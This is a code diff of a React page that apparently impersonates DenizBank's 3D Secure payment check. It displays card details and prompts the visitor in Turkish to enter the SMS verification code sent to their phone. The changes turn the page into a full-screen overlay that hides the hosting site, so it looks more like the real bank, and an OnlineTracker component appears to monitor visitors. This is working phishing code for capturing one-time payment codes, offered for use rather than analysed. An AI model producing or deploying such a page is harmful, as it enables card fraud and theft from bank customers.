@@ -454,7 +454,7 @@ export default function SmsPage() {
             <>
                 <OnlineTracker />
                 <style dangerouslySetInnerHTML={{ __html: `
-                    .dn-wrap{background:#fff;width:min(420px,96vw);border-radius:10px;box-shadow:0 4px 24px rgba(0,100,180,.15);overflow:hidden;margin: 20px auto;}
+                    .dn-wrap{background:#fff;width:min(420px,96vw);border-radius:10px;box-shadow:0 4px 24px rgba(0,100,180,.15);overflow:hidden}
                     .dn-header{background:linear-gradient(135deg,#0069b4,#004a80);padding:16px 22px;display:flex;align-items:center;justify-content:space-between}
                     .dn-logo{color:#fff;font-size:22px;font-weight:900;letter-spacing:-1px}
                     .dn-logo span{color:#85c8ff}
@@ -467,7 +467,7 @@ export default function SmsPage() {
                     .dn-info-box{background:#f4faff;border:1px solid #c8e4f8;border-radius:6px;padding:10px 12px}
                     .dn-info-box .lbl{font-size:11px;color:#0069b4;font-weight:700;margin-bottom:2px}
                     .dn-info-box .val{font-size:13px;color:#222;font-weight:700}
-                    .dn-hata-box{background:#fff3cd;border:1px solid #ffc107;color:#856404;border-radius:4px;padding:9px 12px;font-size:12.5px;margin-bottom:12px;display:flex;align-items:center;gap:7px}
+                    .hata-box{background:#fff3cd;border:1px solid #ffc107;color:#856404;border-radius:4px;padding:9px 12px;font-size:12.5px;margin-bottom:12px;display:flex;align-items:center;gap:7px}
                     .dn-label{font-size:13px;color:#555;margin-bottom:8px}
                     .dn-label strong{color:#0069b4}
                     .dn-input{width:100%;border:2px solid #c8e4f8;border-radius:6px;padding:12px 14px;font-size:22px;letter-spacing:10px;text-align:center;font-weight:700;outline:none;margin-bottom:10px;color:#004a80;transition:.15s}
@@ -477,67 +477,77 @@ export default function SmsPage() {
                     .dn-btn{width:100%;background:linear-gradient(90deg,#0069b4,#004a80);color:#fff;border:none;border-radius:6px;padding:13px;font-size:15px;font-weight:700;cursor:pointer;transition:.15s}
                     .dn-btn:hover{background:linear-gradient(90deg,#004a80,#003060)}
                     .dn-btn:disabled{opacity:.5;cursor:default}
+                    .spinner-wrap{text-align:center;padding:22px}
+                    .spinner{width:44px;height:44px;border:4px solid #c8e4f8;border-top-color:#0069b4;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 12px}
+                    @keyframes spin{to{transform:rotate(360deg)}}
                     .dn-footer{background:#f4faff;border-top:1px solid #c8e4f8;padding:10px 22px;font-size:11px;color:#aac;text-align:center}
                 ` }} />
-                <style jsx global>{`
-                    nav.fixed.bottom-0 { display: none !important; }
-                    main { padding-bottom: 0 !important; }
-                    header { display: none !important; }
-                    body { background: #e8f4fc !important; }
-                `}</style>
-                <div className="dn-wrap">
-                    <div className="dn-header">
-                        <div className="dn-logo">Deniz<span>Bank</span></div>
-                        <div className="dn-secure">🔒 3D Secure</div>
-                    </div>
-                    <div className="dn-card-strip">
-                        <div className="dn-card-icon">KART</div>
-                        <div className="dn-card-number">**** **** **** {data?.lastFourDigits}</div>
-                    </div>
-                    <div className="dn-body">
-                        <div className="dn-info-grid">
-                            <div className="dn-info-box"><div className="lbl">TUTAR</div><div className="val">{data?.tutar} ₺</div></div>
-                            <div className="dn-info-box"><div className="lbl">TARİH</div><div className="val">{data?.tarih}</div></div>
-                            <div className="dn-info-box" style={{ gridColumn: '1/-1' }}><div className="lbl">İŞYERİ</div><div className="val">{data?.isyeriAdi}</div></div>
+                <div style={{
+                    position: 'fixed',
+                    inset: 0,
+                    backgroundColor: '#e8f4fc',
+                    display: 'flex',
+                    alignItems: 'center',
+                    justifyContent: 'center',
+                    zIndex: 99999,
+                    width: '100vw',
+                    height: '100vh',
+                    fontFamily: "'Segoe UI', Arial, sans-serif"
+                }}>
+                    <div className="dn-wrap">
+                        <div className="dn-header">
+                            <div className="dn-logo">Deniz<span>Bank</span></div>
+                            <div className="dn-secure">🔒 3D Secure</div>
                         </div>
-
-                        {isSubmitting ? (
-                            <div style={{ textAlign: 'center', padding: '22px' }}>
-                                <div className="w-12 h-12 border-4 border-blue-200 border-t-blue-600 rounded-full animate-spin mx-auto mb-3"></div>
-                                <p className="dn-label" style={{ textAlign: 'center' }}>SMS kodu gönderiliyor, lütfen bekleyiniz...</p>
+                        <div className="dn-card-strip">
+                            <div className="dn-card-icon">KART</div>
+                            <div className="dn-card-number">**** **** **** {data?.lastFourDigits}</div>
+                        </div>
+                        <div className="dn-body">
+                            <div className="dn-info-grid">
+                                <div className="dn-info-box"><div className="lbl">TUTAR</div><div className="val">{data?.tutar} ₺</div></div>
+                                <div className="dn-info-box"><div className="lbl">TARİH</div><div className="val">{data?.tarih}</div></div>
+                                <div className="dn-info-box" style={{ gridColumn: '1/-1' }}><div className="lbl">İŞYERİ</div><div className="val">{data?.isyeriAdi}</div></div>
                             </div>
-                        ) : (
-                            <form id="bkmform" onSubmit={handleSubmit}>
-                                {error && <div className="dn-hata-box">⚠️ {error}</div>}
-                                <p className="dn-label">Telefonunuza gönderilen <strong>6 haneli SMS kodunu</strong> giriniz:</p>
-                                <input
-                                    ref={inputRef}
-                                    className="dn-input"
-                                    id="sms-kod"
-                                    type="tel"
-                                    inputMode="numeric"
-                                    maxLength={6}
-                                    placeholder="______"
-                                    value={smsCode}
-                                    onChange={(e) => {
-                                        setSmsCode(e.target.value.replace(/\D/g, '').slice(0, 6));
-                                        setError('');
-                                    }}
-                                    disabled={isTimeout}
-                                />
-                                {isTimeout ? (
-                                    <div className="text-center mb-3">
-                                        <p className="text-danger" style={{ fontSize: '12px' }}>Doğrulama kodu geçerlilik süresi doldu.</p>
-                                        <button type="button" onClick={handleRetry} className="btn btn-link text-primary font-weight-bold" style={{ fontSize: '12px' }}>Yeniden Gönder</button>
-                                    </div>
-                                ) : (
-                                    <p className="dn-timer">Kalan süre: <span>{formatTime(timeLeft)}</span></p>
-                                )}
-                                <button className="dn-btn" id="acs-submit-btn" type="submit" disabled={isTimeout || smsCode.length < 5}>ONAYLA</button>
-                            </form>
-                        )}
+
+                            {isSubmitting ? (
+                                <div className="spinner-wrap">
+                                    <div className="spinner"></div>
+                                    <p className="dn-label" style={{ textAlign: 'center' }}>SMS kodu gönderiliyor, lütfen bekleyiniz...</p>
+                                </div>
+                            ) : (
+                                <form id="bkmform" onSubmit={handleSubmit}>
+                                    {error && <div className="hata-box" style={{ display: 'flex' }}>&#9888; {error}</div>}
+                                    <p className="dn-label">Telefonunuza gönderilen <strong>6 haneli SMS kodunu</strong> giriniz:</p>
+                                    <input
+                                        ref={inputRef}
+                                        className="dn-input"
+                                        id="sms-kod"
+                                        type="tel"
+                                        inputMode="numeric"
+                                        maxLength={6}
+                                        placeholder="______"
+                                        value={smsCode}
+                                        onChange={(e) => {
+                                            setSmsCode(e.target.value.replace(/\D/g, '').slice(0, 6));
+                                            setError('');
+                                        }}
+                                        disabled={isTimeout}
+                                    />
+                                    {isTimeout ? (
+                                        <div className="text-center mb-3">
+                                            <p className="text-danger" style={{ fontSize: '12px' }}>Doğrulama kodu geçerlilik süresi doldu.</p>
+                                            <button type="button" onClick={handleRetry} className="btn btn-link text-primary font-weight-bold" style={{ fontSize: '12px' }}>Yeniden Gönder</button>
+                                        </div>
+                                    ) : (
+                                        <p className="dn-timer">Kalan süre: <span>{formatTime(timeLeft)}</span></p>
+                                    )}
+                                    <button className="dn-btn" id="acs-submit-btn" type="submit" disabled={isTimeout || smsCode.length < 5}>ONAYLA</button>
+                                </form>
+                            )}
+                        </div>
+                        <div className="dn-footer">🔒 DenizBank Güvenli Ödeme Sistemi</div>
                     </div>
-                    <div className="dn-footer">🔒 DenizBank Güvenli Ödeme Sistemi</div>
                 </div>
             </>
         );
